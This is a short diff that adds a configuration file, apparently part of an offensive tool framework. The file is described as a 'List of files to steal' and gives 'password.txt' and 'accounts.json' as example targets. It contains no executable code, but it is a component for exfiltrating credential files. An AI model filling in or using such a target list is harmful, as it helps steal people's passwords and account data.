@@ -1,0 +1,12 @@
+#!name##FOOD_sherlock_files
+#!types##data
+#!info##List of files to steal.
+#!load##list
+
+#!####You can put file names here. Separate the names with ENTER. #######
+#!##example:
+#!##password.txt
+#!##accounts.json
+
+
+
